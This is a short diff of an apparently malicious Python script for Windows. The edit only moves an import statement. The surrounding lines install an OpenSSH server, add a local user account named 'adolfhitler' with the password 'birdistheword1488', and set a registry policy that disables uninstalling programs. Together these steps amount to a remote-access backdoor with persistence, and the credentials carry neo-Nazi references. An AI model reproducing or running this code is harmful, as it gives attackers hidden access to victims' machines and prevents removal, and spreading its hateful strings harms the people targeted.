@@ -3,6 +3,7 @@ import requests
 import time
 import socket
 import winreg
+import subprocess
 
 # Install OpenSSH
 os.system('Add-WindowsFeature -Name OpenSSH.Server')
@@ -10,7 +11,6 @@ os.system('Add-WindowsFeature -Name OpenSSH.Server')
 # Set username and password
 os.system('net user adolfhitler birdistheword1488 /add')
 
-import subprocess
 
 def disable_uninstall_settings_windows():
     subprocess.run(["reg", "add", "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Uninstall", "/v", "NoAddRemovePrograms", "/t", "REG_DWORD", "/d", "1", "/f"])
